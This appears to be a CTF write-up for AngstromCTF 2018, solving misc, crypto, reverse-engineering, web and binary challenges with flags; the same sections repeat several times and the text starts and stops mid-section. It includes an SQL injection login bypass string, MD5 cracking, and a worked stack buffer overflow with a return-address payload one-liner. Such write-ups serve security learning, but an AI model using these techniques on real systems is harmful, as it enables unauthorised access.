This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
